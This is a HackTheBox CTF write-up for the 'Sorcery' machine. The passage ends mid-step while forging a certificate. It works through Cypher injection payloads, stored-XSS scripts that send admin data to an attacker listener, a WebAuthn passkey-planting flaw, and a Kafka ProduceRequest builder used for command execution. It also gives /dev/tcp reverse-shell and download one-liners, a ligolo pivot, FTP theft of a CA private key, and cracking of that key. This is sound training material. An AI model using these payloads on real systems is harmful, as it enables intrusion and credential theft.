---
title: Sorcery
categories: [HackTheBox]
tags: [nmap, rust, cypher-injection, neo4j, xss, webauthn, passkey, kafka, dns-rce, ligolo, ftp, mitmproxy, docker, ipa, ldap, linux]
media_subpath: /images/hackthebox_sorcery/
image:
  path: 'https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/531d99642e57872a77dc86168ac64238.png'
---

## Summary

**Sorcery** is an Insane-rated Linux machine built around a full open-source stack: a Rust/Rocket backend, a Next.js frontend, Neo4j, Kafka, a custom DNS service, FTP, MailHog, Gitea, and a headless-Chrome automation bot. Having the source is load-bearing throughout.

The attack chain revolves around four converging primitives discovered entirely through code review:

1. **Cypher injection** in a proc-macro (`#[derive(Model)]` generates unescaped `format!` queries) exposes every Neo4j node via `Product::get_by_id`. Used to leak the Seller registration key and, optionally, rewrite `admin.password`.
2. **Stored XSS** via `dangerouslySetInnerHTML` on product descriptions, combined with the Seller product-insert endpoint that spawns headless Chrome authenticated as admin.
3. **Passkey registration state mismatch**: `start_registration` stores challenge state under the *target's* `user.id` while `finish_registration` retrieves it under the *caller's* `user.id`, allowing an attacker to plant a WebAuthn credential on admin's account from JavaScript running in the admin bot.
4. **Debug endpoint TCP relay** + Kafka `update` topic consumer that runs message values as `bash -c`, giving RCE inside the dns container once we can produce to Kafka with a crafted v0 ProduceRequest.

From the dns container shell: ligolo-ng pivot to the internal network, anonymous FTP leaks `RootCA.key` (passphrase `password`), sign a forged cert, poison the internal DNS, run mitmproxy in reverse mode against Gitea, send a phishing email via MailHog to the mail bot, and capture `tom_summers` credentials. From there: Xvfb framebuffer dump leaks `tom_summers_admin`, a `strace` race against `docker-credential-docker-auth` leaks `rebecca_smith`, reversing the .NET credential helper reveals a predictable OTP letting us auth to the local Docker registry whose `test-domain-workstation` image embeds `donna_adams` IPA enrollment creds, a scoped LDAP ACI on `donna_adams` lets us reset `ash_winter`'s password, and `ash_winter`'s own LDAP ACI lets her add herself to `sysadmins`, which carries `manage_sudorules_ldap`, enabling `(ALL:ALL) ALL` sudo after an sssd restart.

> The box IP changed mid-engagement after a reset. Initial recon used `10.129.237.242`; later sessions used `10.129.33.166`. Both appear in this writeup. `sorcery.htb` was updated in `/etc/hosts` each time.
{: .prompt-info}

## Box Info

| Field | Value |
|---|---|
| Name | Sorcery |
| OS | Ubuntu 24.04 (host) + Docker containers |
| Difficulty | Insane |
| Domain | `sorcery.htb` |
| IP | `10.129.237.242` / `10.129.33.166` (post-reset) |
| Source code | `https://git.sorcery.htb/nicole_sullivan/infrastructure` (anonymous clone) |

---

## 0. Recon

```
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
443/tcp open  ssl/http nginx 1.27.1
```

```bash
curl -kI https://10.129.237.242
# HTTP/1.1 301 Moved Permanently
# Location: https://sorcery.htb/

echo '10.129.237.242 sorcery.htb' | sudo tee -a /etc/hosts
```

![Sorcery login screen](file-20260424103416336.png)

The login screen exposes three tabs: **Login**, **Passkey**, **Register**. Registering as a Client is open (username + password). A second optional field marked *registration key* grants the **Seller** role.

![Login, Passkey, and Register tabs](file-20260424103442444.png)
![Registration form with optional registration key field](file-20260424103516377.png)

### Source-code access

The login footer reads *"We love open source! Check out our repo"*, linking to `git.sorcery.htb` - a Gitea instance. The repo `nicole_sullivan/infrastructure` is clonable anonymously:

```bash
GIT_SSL_NO_VERIFY=true git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
cd infrastructure && ls
# .git  backend  backend-macros  dns  docker-compose.yml  frontend
```

The repo ships the **entire** stack:

| Service | Tech | Purpose |
|---|---|---|
| `backend` | Rust / Rocket | JSON API, Neo4j (via `neo4rs`), Kafka, WebAuthn |
| `backend-macros` | proc-macro | `#[derive(Model)]` generates all Neo4j queries |
| `frontend` | Next.js (App Router) | React Server Components + Server Actions |
| `dns` | Rust | Kafka consumer that maintains a zone file |
| `kafka` | Confluent Kafka | message bus between backend and dns |
| `neo4j` | community 5.23 | graph DB (User, Product, Post, Config) |
| `ftp`, `mail`, `gitea`, `mail_bot`, `nginx` | off-the-shelf | supporting services |

---

## 1. Cypher Injection in `#[derive(Model)]`

### 1.1 Finding the sink

`backend-macros/src/lib.rs:143-168` expands `#[derive(Model)]` into `get_by_<field>` methods on every struct field. The critical lines:

{% raw %}
```rust
quote! {
    pub async fn #function_name(#name: #type_) -> Option<Self> {
        let graph = crate::db::connection::GRAPH.get().await;
        let query_string = format!(
            r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
            #struct_name, #name_string, #name     // #name is the caller-supplied value
        );
        let row = match graph.execute(
            ::neo4rs::query(&query_string)
        ).await.unwrap().next().await { ... };
        Self::from_row(row).await
    }
}
```
{% endraw %}

The third placeholder takes the runtime argument and splices it into a Cypher literal between `"..."` with **no escaping** and no use of `neo4rs::query().param()`.

Every user-callable `get_by_username` validates the username against `^[a-zA-Z0-9]+$` (`auth.rs:29-35`), so that surface is closed. But `Product::get_by_id` is reached from:

```rust
// backend/src/api/products/get_one.rs
#[get("/<id>")]
pub async fn get_one(guard: RequireClient, id: &str) -> Result<Json<Response>, AppError> {
    let product = match Product::get_by_id(id.to_owned()).await { ... };
```

No validator on `id`. Registration for Client is open, so the precondition is trivial.

### 1.2 Confirming - one stray `"` breaks the query

Paste a bare `"` in the path and the MATCH becomes ill-formed:

```
https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f"
```

![5xx error triggered by the stray quote in the URL](file-20260424105828545.png)
_The 5xx confirms the string literal escape landed in a Cypher parser._

### 1.3 Shaping the result

The backend's `from_row` decoder reads the row's `BoltMap` named `result` and pulls five fields: `id`, `name`, `description`, `is_authorized`, `created_by_id`. Any injection must **RETURN a map named `result` containing all five keys** or the `.expect()` panics.

Cypher **map projection** solves this: `result{.*, description: c.registration_key}` takes the existing `result` binding, spreads all five properties with `.*`, then overrides only the field we want to leak.

### 1.4 PoC: arbitrary field override

Payload (goes in the `<UUID>` slot of `/dashboard/store/<UUID>`):

```
88b6b6c5-a614-486c-9d51-d255f47efb4f" }) RETURN result{.*,name:'INJECTED',description:'INJECTED'} as result; //
```

> **Browser quirk - encode the trailing `//` as `%2f%2f`.** Typing `//` in the URL bar causes browsers to collapse consecutive slashes as path separators, so the Cypher line-comment is dropped and the whole query fails to parse. Passing `%2f%2f` leaves the browser alone. Every payload URL below follows this rule; the decoded form is shown for readability.
{: .prompt-warning}

Resolved Cypher on the backend:
```cypher
MATCH (result: Product { id: "88b6b6c5-...-d255f47efb4f" })
RETURN result{.*, name:'INJECTED', description:'INJECTED'} as result;
//" }) RETURN result       -- the rest of the template is commented out
```

![Product page rendering injected name and description values](file-20260424111844842.png)

### 1.5 Leak 1: admin password hash

```
88b6b6c5-a614-486c-9d51-d255f47efb4f" }) MATCH (u:User{username:'admin'}) RETURN result{.*,description:u.password} as result; //
```

![Leaking admin Argon2id hash via Cypher map projection](file-20260424112107174.png)

Argon2id hash: `$argon2id$v=19$m=19456,t=2,p=1$T+K9waOashQqEOcDljfe5Q$X5Yul0HakDZrbkEDxnfn2KYJv/BdaFsXn7xNwS1ab8E` - infeasible to crack directly, but we have another route (see §5).

### 1.6 Leak 2: Seller registration key

The `Config` node (`backend/src/db/connection.rs:22-28`) stores a UUID generated on first migration:

```rust
pub static ref REGISTRATION_KEY: AsyncOnce<String> = AsyncOnce::new(async {
    let mut configs = Config::get_all().await;
    configs.remove(0).registration_key
});
```

Grab it via the same sink:

```
88b6b6c5-a614-486c-9d51-d255f47efb4f" }) MATCH (c:Config) RETURN result{.*,description:c.registration_key} as result; //
```

![Leaking Config registration_key via Cypher map projection](file-20260424112056671.png)

`dd05d743-b560-45dc-9a09-43ab18c7a513`. Register a new account with this key to obtain the **Seller** role.

![Seller registration form with leaked registration key](file-20260424112148050.png)
![Seller dashboard after successful registration](file-20260424112209260.png)

---

## 2. Stored XSS via Seller Product Descriptions

### 2.1 The sink

`frontend/src/app/dashboard/store/[product]/page.tsx:29-34`:

{% raw %}
```jsx
<p className="mb-4 text-xl"
   dangerouslySetInnerHTML={{ __html: product.description }} />
```
{% endraw %}

Unsanitized `dangerouslySetInnerHTML` on attacker-controlled data.

### 2.2 The admin-browser trigger

`backend/src/api/products/insert.rs:38-121` is the Seller-only product-create endpoint. On every create:

1. Saves the product.
2. Looks up admin (`User::get_by_username("admin")`).
3. Forges a fresh admin JWT with:
   ```rust
   only_for_paths: Some(vec![
       r"^\/api\/product\/[a-zA-Z0-9-]+$",
       r"^\/api\/webauthn\/passkey\/register\/start$",
       r"^\/api\/webauthn\/passkey\/register\/finish$",
   ]),
   with_passkey: true,
   exp: now + 60s,
   ```
4. Spawns headless Chrome (`sandbox: false`, random CDP port 8000-9000), injects the JWT cookie, navigates to `/dashboard/store/<id>`, waits 10s, closes.

Any HTML the Seller puts in `description` executes in an admin-authenticated browser session, with a token pinned to just three backend routes - crucially, `passkey/register/start` and `passkey/register/finish`.

### 2.3 Confirming XSS fires in the bot

A simple image beacon in the description:

```html
<img src="http://10.10.15.242:8000/admin-visited">
```

![XSS payload embedded in product description field](file-20260424112422799.png)

![Listener receiving the beacon hit from the box](file-20260424112441648.png)

Hit from `10.129.237.242` within seconds - XSS confirmed, description HTML rendered in an admin context.

---

## 3. Passkey Registration State Mismatch

### 3.1 Asymmetric keying

`backend/src/api/webauthn/passkey/start_registration.rs:37-58`:

```rust
let Json(Request { username }) = data.into_inner();
let username = username.as_ref().unwrap_or(&guard.claims.username);  // client-supplied
let user = User::get_by_username(username.clone()).await?;
// ... generate challenge ...
passkey_store.registrations.lock().unwrap().insert(user.id.clone(), state);
//                                                  ^^^^^^^^^ stored under TARGET's id
```

`finish_registration.rs:26-48`:

```rust
let Some(state) = registrations.get(&guard.claims.id) else { return Err(Unauthorized) };
//                                  ^^^^^^^^^^^^^^^^ retrieved under CALLER's id
// ... verify credential against state ...
passkey_store.passkeys.lock().unwrap().insert(guard.claims.id, passkey);
//                                            ^^^^^^^^^^^^^^^ stored under CALLER's id
```

This gives a one-step state plant: any authenticated user can call `start_registration({"username":"admin"})` and a passkey-registration state is queued under `admin.id`. When the admin bot (via XSS) calls `finish_registration(<credential>)`, the caller is admin, its lookup lands on the state we planted, the credential validates, and `admin.id` gets the attacker's credential written in.

### 3.2 Approach: split across two XSS triggers

Not a timing race. Two sequential stored-XSS primitives separated by a manual signing step:

| Phase | Who runs it | What it does |
|---|---|---|
| **Phase 1** | Admin bot, via XSS #1 | `startRegistration()` (defaults to admin from its JWT), exfils the issued `publicKey` (challenge + admin user.id) to our listener. State is planted under `admin.id`. |
| **Phase 2** | Attacker, Chromium, virtual authenticator | `navigator.credentials.create({publicKey: ...})` locally - signs challenge, captures the resulting credential JSON. |
| **Phase 3** | Admin bot, via XSS #2 | `finishRegistration(<our credential>)` - server retrieves state under `admin.id`, verifies our credential, admin's passkey is now our credential. |

### 3.3 Next.js Server-Action hashes

Both registration endpoints sit behind Next.js server actions on `/dashboard/profile`. The three stable 40-char hex hashes:

| Action | `Next-Action` header |
|---|---|
| `getPasskey` | `343f2024ab867ea53d4ee982ecfff51b80bdd1ce` |
| `startRegistration` | `062f18334e477c66c7bf63928ee38e241132fabc` |
| `finishRegistration` | `60971a2b6b26a212882926296f31a1c6d7373dfa` |

Identified by probing each with an empty body - `startRegistration` returns a challenge, `getPasskey` returns `{passkeyId:null}`, `finishRegistration` 422s on empty body.

### 3.4 Watching the normal flow

Before firing the attack, observe a legitimate registration in our own Seller tab: DevTools WebAuthn panel, **Enable virtual authenticator environment**, Add authenticator (ctap2 / internal / resident keys + UV on).

![DevTools WebAuthn panel with virtual authenticator enabled](file-20260424113528687.png)
![Add authenticator dialog](file-20260424113615635.png)
![Authenticator configuration options](file-20260424113652293.png)
![Passkey enrollment button on the profile page](file-20260424113706426.png)

Click **Enroll Passkey** - two POSTs to `/dashboard/profile`:

| # | `Next-Action` | Body | What it does |
|---|---|---|---|
| 1 | `startRegistration` hash | `[]` | Returns challenge, browser auto-invokes the authenticator |
| 2 | `finishRegistration` hash | `[<credential JSON>]` | Sends the signed credential to backend |

![startRegistration POST and challenge response](file-20260424113950929.png)
![finishRegistration POST with signed credential](file-20260424114003620.png)
![Success response from finishRegistration](file-20260424114016040.png)

This gives us the exact request shape we need to replay under admin's context.

### 3.5 Phase 1 payload - bot exfils admin's challenge

```html
<img src=x onerror='(async()=>{
  const r=await fetch("/dashboard/profile",{method:"POST",headers:{"Next-Action":"062f18334e477c66c7bf63928ee38e241132fabc","Content-Type":"text/plain;charset=UTF-8","Accept":"text/x-component"},body:"[]"});
  const t=await r.text();
  fetch("http://10.10.15.242:8000/p1?d="+btoa(t));
})()'>
```

Seller inserts a product with this description. Admin bot loads `/dashboard/store/<id>`, XSS runs as admin, `startRegistration()` defaults to admin (per `start_registration.rs:38`), state is planted under `admin.id`, response base64'd to our listener.

```
10.129.237.242 - - [24/Apr/2026 12:50:23] "GET /p1?d=MDpbIiRAMSIsWyJlTVhUa0h1TFBWaXFWMFFwTlRTQ1YiLG51bGxdXQoxOnsicmVzdWx0Ijp7ImNoYWxsZW5nZSI6eyJwdWJsaWNLZXkiOnsicnAiOnsibmFtZSI6InNvcmNlcnkuaHRiIiwiaWQiOiJzb3JjZXJ5Lmh0YiJ9LCJ1c2VyIjp7ImlkIjoiTFo4Tm5nazFTZk92elNtcjAwSndFUSIsIm5hbWUiOiJhZG1pbiIsImRpc3BsYXlOYW1lIjoiYWRtaW4ifSwiY2hhbGxlbmdlIjoiZHFWWjRSeVRjNkdBYkxqeWp6akV0a1NOb19oeUdoV1RuTjdXa0lCRkhxayIsInB1YktleUNyZWRQYXJhbXMiOlt7InR5cGUiOiJwdWJsaWMta2V5IiwiYWxnIjotN30seyJ0eXBlIjoicHVibGljLWtleSIsImFsZyI6LTI1N31dLCJ0aW1lb3V0IjozMDAwMDAsImF1dGhlbnRpY2F0b3JTZWxlY3Rpb24iOnsicmVzaWRlbnRLZXkiOiJkaXNjb3VyYWdlZCIsInJlcXVpcmVSZXNpZGVudEtleSI6ZmFsc2UsInVzZXJWZXJpZmljYXRpb24iOiJyZXF1aXJlZCJ9LCJhdHRlc3RhdGlvbiI6Im5vbmUiLCJleHRlbnNpb25zIjp7ImNyZWRlbnRpYWxQcm90ZWN0aW9uUG9saWN5IjoidXNlclZlcmlmaWNhdGlvblJlcXVpcmVkIiwiZW5mb3JjZUNyZWRlbnRpYWxQcm90ZWN0aW9uUG9saWN5IjpmYWxzZSwidXZtIjp0cnVlLCJjcmVkUHJvcHMiOnRydWV9fX19fQo= HTTP/1.1" 404 -
```

Base64-decoded:
```
0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]
1:{"result":{"challenge":{"publicKey":{"rp":{"name":"sorcery.htb","id":"sorcery.htb"},"user":{"id":"LZ8Nngk1SfOvzSmr00JwEQ","name":"admin","displayName":"admin"},"challenge":"dqVZ4RyTc6GAbLjyjzjEtkSNo_hyGhWTnN7WkIBFHqk", ...
```

Admin's UUID in base64url: `LZ8Nngk1SfOvzSmr00JwEQ`, challenge: `dqVZ4RyTc6GAbLjyjzjEtkSNo_hyGhWTnN7WkIBFHqk`. webauthn-rs state TTL is ~5 minutes - Phase 2 + Phase 3 must complete inside that window.

### 3.6 Phase 2 - sign locally

Chromium on `https://sorcery.htb` (origin must match RP), virtual authenticator enabled. DevTools Console:

```js
const b64urlToBuf = s => { s=s.replace(/-/g,'+').replace(/_/g,'/'); while(s.length%4) s+='='; const b=atob(s); const u=new Uint8Array(b.length); for(let i=0;i<b.length;i++) u[i]=b.charCodeAt(i); return u.buffer; };
const bufToB64url = buf => { const a=new Uint8Array(buf); let s=''; for(let i=0;i<a.length;i++) s+=String.fromCharCode(a[i]); return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); };

const pk = {"rp":{"name":"sorcery.htb","id":"sorcery.htb"},"user":{"id":"LZ8Nngk1SfOvzSmr00JwEQ","name":"admin","displayName":"admin"},"challenge":"dqVZ4RyTc6GAbLjyjzjEtkSNo_hyGhWTnN7WkIBFHqk","pubKeyCredParams":[{"type":"public-key","alg":-7},{"type":"public-key","alg":-257}],"timeout":300000,"authenticatorSelection":{"residentKey":"discouraged","requireResidentKey":false,"userVerification":"required"},"attestation":"none","extensions":{"credentialProtectionPolicy":"userVerificationRequired","enforceCredentialProtectionPolicy":false,"uvm":true,"credProps":true}};

(async () => {
  const cred = await navigator.credentials.create({
    publicKey: { ...pk,
      challenge: b64urlToBuf(pk.challenge),
      user: { ...pk.user, id: b64urlToBuf(pk.user.id) },
      excludeCredentials: (pk.excludeCredentials||[]).map(c=>({...c,id:b64urlToBuf(c.id)}))
    }
  });
  window.SIGNED = {
    id: cred.id,
    rawId: bufToB64url(cred.rawId),
    response: {
      attestationObject: bufToB64url(cred.response.attestationObject),
      clientDataJSON: bufToB64url(cred.response.clientDataJSON),
      transports: cred.response.getTransports ? cred.response.getTransports() : ['internal']
    },
    type: cred.type,
    clientExtensionResults: cred.getClientExtensionResults ? cred.getClientExtensionResults() : {}
  };
  const hdr = [...atob(window.SIGNED.response.attestationObject.replace(/-/g,'+').replace(/_/g,'/'))].slice(0,5).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
  console.log('[+] CBOR header:', hdr, hdr==='a3 63 66 6d 74' ? 'OK' : 'WRONG');
  console.log('[+] SIGNED:', JSON.stringify(window.SIGNED));
})();
```

Output:
```
[+] CBOR header: a3 63 66 6d 74 OK
[+] SIGNED: {"id":"Eo4eibUZybZ-OWaplSCwXyeU3SmgaXjYfVqaf3GSZ2c","rawId":"Eo4eibUZybZ-OWaplSCwXyeU3SmgaXjYfVqaf3GSZ2c","response":{"attestationObject":"o2NmbXRkbm9uZWdhdHRTdG10oGhhdXRoRGF0YVik1y0k..."}...}
```

`a3 63 66 6d 74` = CBOR `map(3) text(3) "fmt"` - well-formed attestation object that webauthn-rs will accept. **Do not refresh the tab** - the virtual authenticator's private key lives in memory and is needed in §4 (passkey auth).

### 3.7 Phase 3 - bot finishes registration

```html
<img src=x onerror='fetch("/dashboard/profile",{method:"POST",headers:{"Next-Action":"60971a2b6b26a212882926296f31a1c6d7373dfa","Content-Type":"text/plain;charset=UTF-8"},body:JSON.stringify([{"id":"Eo4eibUZybZ-OWaplSCwXyeU3SmgaXjYfVqaf3GSZ2c","rawId":"Eo4eibUZybZ-OWaplSCwXyeU3SmgaXjYfVqaf3GSZ2c","response":{"attestationObject":"o2NmbXRkbm9uZWdhdHRTdG10oGhhdXRoRGF0YVik1y0kbF3SM6Vjz3BxHwSL4C41rSqQitYLnqmT7rlyd55FAAAAAQECAwQFBgcIAQIDBAUGBwgAIBKOHom1Gcm2fjlmqZUgsF8nlN0poGl42H1amn9xkmdnpQECAyYgASFYICPIADANmiKhk5FDTfXx0vzUkifcTQVyCbI9DXeo9MQiIlggt0YFCAqtCGEdpjDrEuqUwN8CelgOFd3f7GfHR5MjStI","clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiZHFWWjRSeVRjNkdBYkxqeWp6akV0a1NOb19oeUdoV1RuTjdXa0lCRkhxayIsIm9yaWdpbiI6Imh0dHBzOi8vc29yY2VyeS5odGIiLCJjcm9zc09yaWdpbiI6ZmFsc2V9","transports":["internal"]},"type":"public-key","clientExtensionResults":{"credProps":{"rk":false}}}])}).then(r=>r.text()).then(t=>fetch("http://10.10.15.242:8000/p3?s="+btoa(t)))'>
```

Second product, same sink, bot fires our XSS.

```
10.129.237.242 - - [24/Apr/2026 13:02:50] "GET /p3?s=MDpbIiRAMSIsWyJlTVhUa0h1TFBWaXFWMFFwTlRTQ1YiLG51bGxdXQoxOnsicmVzdWx0IjpudWxsfQo= HTTP/1.1" 404 -

echo 'MDpbIiRAMSIsWyJlTVhUa0h1TFBWaXFWMFFwTlRTQ1YiLG51bGxdXQoxOnsicmVzdWx0IjpudWxsfQo=' | base64 -d
0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]
1:{"result":null}
```

`"result":null` = success. Admin's passkey is now our virtual authenticator's key.

---

## 4. Authenticate as Admin with the Planted Passkey

`/auth/passkey` page has its own three server actions (stable Next-Action hashes, identified by probing):

| Action | `Next-Action` header |
|---|---|
| `startAuthentication` | `1efff30d879f3aea7d899128311edf11046f4a10` |
| `finishAuthentication` (and the companion username-lookup action) | `5aa9f80bc40bd5a48cfafdb9fff8913dfa09619f` and `7abc1d84ff816e8d6965b2132e8011685a8c9917` |

Two hashes are listed for the second row because one is the action itself and the other is its companion username-lookup; loop both in turn until one succeeds. The `startAuthentication` response includes `allowCredentials[0].id` equal to our just-planted credential ID. Same DevTools tab (authenticator still loaded from §3.6), sign via `navigator.credentials.get()`, POST the assertion to the matching `finishAuthentication` hash. On success the server sets a fresh cookie - a **full admin JWT** with `with_passkey: true` and no `only_for_paths`.

![startAuthentication POST returning the challenge with our credential ID](file-20260424123520778.png)
![finishAuthentication POST with signed assertion](file-20260424123552710.png)
![Admin dashboard confirming full passkey-authenticated session](file-20260424123605538.png)

---

## 5. Alternative Path: Cypher SET on admin.password

The same macro-generated sink that lets us `RETURN` admin's hash also allows a `SET`. Login (`backend/src/api/auth/login.rs:41-48`) calls `Argon2::verify_password(client_input, user.password)` - if we overwrite `admin.password` with a hash whose preimage we know, we log in with that password.

Copy our own Seller's hash onto admin:

```
88b6b6c5-a614-486c-9d51-d255f47efb4f" }) WITH result MATCH (us:User {username:'railoca'}), (a:User {username:'admin'}) SET a.password = us.password RETURN result; //
```

Resolved:
```cypher
MATCH (result: Product { id: "88b6b6c5-..." })
WITH result
MATCH (us:User {username:'railoca'}), (a:User {username:'admin'})
SET a.password = us.password
RETURN result;   -- commented tail
```

`WITH result` carries the Product binding across the SET so `from_row()` still gets its five fields. Login as `admin:<our seller password>`:

![Direct login as admin after password overwrite](file-20260424130703854.png)

Login returns a JWT but with `with_passkey:false` hardcoded (`login.rs:54`) - that **cannot** hit `/api/debug/port` on its own. To continue, either:

1. Enroll a passkey legitimately now that we are admin (register/start → `navigator.credentials.create` → register/finish), then authenticate via passkey for a full admin+passkey JWT.
2. Use the passkey-overwrite chain (§§2-4).

Both land in the same place. The SET path skips every XSS, bot, and Next.js Server-Action step.

---

## 6. Debug Endpoint to Kafka to DNS RCE

### 6.1 The debug endpoint

`backend/src/api/debug/debug.rs:27-74`. Guarded by **`RequireAdmin` + `RequirePasskey`**:

```rust
#[post("/port", data = "<data>")]
pub fn port_data(
    _guard1: RequireAdmin,
    _guard2: RequirePasskey,
    data: Json<Request>,
) -> Result<Json<Response>, AppError> {
    let Ok(mut stream) = TcpStream::connect(format!("{}:{}", data.host, data.port)) else { ... };
    for request in data.data.iter() {
        let Ok(to_send) = hex::decode(request) else { ... };
        stream.write(to_send.as_slice()).ok();
        if data.expect_result { stream.read_to_end(&mut result).ok(); }
    }
    // ...
}
```

A raw TCP relay. `host:port`, a list of hex-encoded writes, an optional read-to-EOF of the response. Every internal service is in reach: `kafka:9092`, `neo4j:7687`, `backend:8000`, `gitea:3000`, `ftp:21`, `mail:8025`, `frontend:3000`.

### 6.2 The DNS service's Kafka consumer

`dns/src/main.rs:30-99`. Connects to `kafka:9092`, subscribes to topic `update`, and for every message runs the raw bytes as a shell command:

```rust
let Ok(command) = str::from_utf8(message.value) else { continue };
println!("[*] Got new command: {}", command);
let mut process = match Command::new("bash").arg("-c").arg(command).spawn() { ... };
```

Produce one message to topic `update` → `bash -c <message>` inside the dns container.

### 6.3 Crafting the Kafka v0 ProduceRequest

The DNS service uses the pure-Rust `kafka` crate (0.8-0.10 protocol era), so the broker must accept legacy v0 ProduceRequests with old-format MessageSets:

```python
# kprod.py
import struct, zlib, sys

TOPIC = b"update"
CMD = sys.argv[1].encode() if len(sys.argv) > 1 else b"id > /tmp/pwned"
CLIENT = b"x"

# Message v0 body (after CRC): magic(1) attr(1) keylen(4)=-1 vallen(4) value
body = bytes([0, 0]) + struct.pack('>i', -1) + struct.pack('>i', len(CMD)) + CMD
crc  = zlib.crc32(body) & 0xffffffff
msg  = struct.pack('>I', crc) + body

# MessageSet entry: offset(8)=0 size(4) message
msgset = struct.pack('>q', 0) + struct.pack('>i', len(msg)) + msg

# ProduceRequest v0: acks(2) timeout(4) topics[...]
req_body  = struct.pack('>hi', 1, 5000)
req_body += struct.pack('>i', 1)
req_body += struct.pack('>h', len(TOPIC)) + TOPIC
req_body += struct.pack('>i', 1)
req_body += struct.pack('>i', 0)
req_body += struct.pack('>i', len(msgset)) + msgset

# RequestHeader: api_key=0 Produce, api_version=0, correlation_id=1, client_id(STR)
header  = struct.pack('>hhi', 0, 0, 1)
header += struct.pack('>h', len(CLIENT)) + CLIENT

request = header + req_body
wire    = struct.pack('>i', len(request)) + request
print(wire.hex())
```

### 6.4 Fire the beacon (RCE confirmation)

```bash
python3 kprod.py 'exec 3<>/dev/tcp/10.10.15.242/8000; echo -e "GET /dns-beacon-$(hostname) HTTP/1.0\r\n\r\n" >&3; cat <&3 &'
# 000000ac0000000000000001000178000100001388...
```

Paste into the admin **Debug** page: host `kafka`, port `9092`, the hex as data, *Expect response* on:

![Admin debug endpoint with Kafka ProduceRequest](file-20260424133146409.png)

Response: `...error_code=0x0000` (success). Listener fires seconds later:

```
10.129.237.242 - - [24/Apr/2026 13:30:05] "GET /dns-beacon-7bfb70ee5b9c HTTP/1.0" 404 -
```

`7bfb70ee5b9c` = dns container hostname. Inside-container execution confirmed.

### 6.5 Upgrade to reverse shell

```bash
python3 kprod.py 'setsid bash -i >& /dev/tcp/10.10.15.242/9999 0>&1 &'
```

> The `dns` container runs each Kafka message synchronously inside the consumer loop with `Command::new("bash").arg("-c").arg(value).status()`. A plain `bash -i >& /dev/tcp/.../9999 0>&1` blocks that thread for the lifetime of the shell, so any further Kafka traffic (and the frontend's DNS button, which produces to the same topic) hangs. Wrapping in `setsid ... &` detaches the shell from the consumer's process group and returns control immediately, leaving the box fully functional for follow-on payloads.
{: .prompt-info}

![Reverse shell payload via the debug endpoint](file-20260424133316678.png)

```
nc -lvnp 9999
Connection received on 10.129.237.242 53276
bash: cannot set terminal process group (9): Inappropriate ioctl for device
user@7bfb70ee5b9c:/app$
```

Shell as `uid=1001(user)` in the dns container.

---

## 7. Pivot with ligolo-ng

Download the ligolo agent into `/tmp/` from our HTTP listener (already serving on port 8000), mark it executable, connect back to the proxy:

```bash
# Attacker side
ligolo-ng -selfcert -laddr 0.0.0.0:11601

# On the dns container - pull agent via bash /dev/tcp (no curl needed)
cat > agent < /dev/tcp/10.10.15.242/8000 && chmod +x agent

./agent -connect 10.10.15.242:11601 -ignore-cert
```

On attacker:
```
ligolo-ng » session
? Specify a session : 1 - user@7bfb70ee5b9c - 10.129.237.242:57290
[Agent] » autoroute
? Select routes to add: 172.19.0.2/16
INFO Using interface name validwiccan
INFO Starting tunnel to user@7bfb70ee5b9c
```

### 7.1 Internal sweep

```
Discovered open port 22/tcp on 172.19.0.1      <- host
Discovered open port 443/tcp on 172.19.0.1     <- host (nginx)
Discovered open port 53/tcp on 172.19.0.2      <- dns container
Discovered open port 8000/tcp on 172.19.0.4    <- backend
Discovered open port 1025/tcp on 172.19.0.8    <- mail (MailHog SMTP)
Discovered open port 22/tcp on 172.19.0.9
Discovered open port 21/tcp on 172.19.0.10     <- ftp (with RootCA.key)
Discovered open port 443/tcp on 172.19.0.11    <- gitea
```

> Docker's bridge assigns IPs sequentially as containers start, so the exact last octet shifts between box restarts. In §9.3 the swaks command targets `172.19.0.6:1025` - that is the same MailHog service after a container restart moved it from `.0.8` to `.0.6`. Any time you see a different `172.19.0.x`, re-run the sweep to find the new assignment.
{: .prompt-info}

---

## 8. FTP Anonymous - RootCA.crt + RootCA.key

The `ftp` container in `docker-compose.yml:76-90` is `million12/vsftpd` with `ANONYMOUS_ACCESS=true` and mounts the IPA root CA's **private key** into the anonymous public directory:

```yaml
volumes:
  - "./certificates/generated/RootCA.crt:/var/ftp/pub/RootCA.crt"
  - "./certificates/generated/RootCA.key:/var/ftp/pub/RootCA.key"
```

Via the ligolo tunnel to `172.19.0.10`:

```bash
ftp 172.19.0.10
# Name: anonymous   (blank password)
# 230 Login successful.
ftp> cd pub; binary; mget *
# -rw-r--r-- 1 ftp ftp 1826 Oct 31 2024 RootCA.crt
# -rw-r--r-- 1 ftp ftp 3434 Oct 31 2024 RootCA.key
```

Crack the PEM passphrase (trivial dictionary - `password` wins first try):

```bash
while read p; do
    if echo "$p" | openssl pkey -in RootCA.key -passin stdin -noout 2>/dev/null; then
      echo "[+] PASSWORD: $p"; break
    fi
  done < pwlist.txt
# [+] PASSWORD: password
```

Hashcat (mode `24420`, *PKCS#8 PBKDF2-HMAC-SHA256 + AES*) is the faster path if you do not already have an `openssl` loop, but the John-format string emitted by `pem2john.py` is **not** what mode 24420 expects:

```
# pem2john.py output (does not load in hashcat)
$PEM$2$pbkdf2$sha256$aes256_cbc$4$e08de23b5667e579$2048$...$2384$c28fed...

# 24420 example.hash format (what hashcat wants)
$PEM$2$4$ed02960b8a10b1f1$2048$a634c482a95f23bd...
```

Strip the three intermediate fields (`pbkdf2$sha256$aes256_cbc$`) from the John string and feed the result to hashcat:

```bash
python3 /tools/john/run/pem2john.py Certs/RootCA.key \
  | sed 's/\$pbkdf2\$sha256\$aes256_cbc//' > rootca.hash

hashcat -m 24420 -a 0 rootca.hash /usr/share/wordlists/rockyou.txt
# $PEM$2$4$e08de23b5667e579$2048$...:password
```

Mint a server cert for an attacker subdomain (SAN covers both `evil.sorcery.htb` and `git.sorcery.htb`):

```bash
openssl genrsa -out evil.key 2048
openssl req -new -key evil.key -out evil.csr -subj "/CN=evil.sorcery.htb"
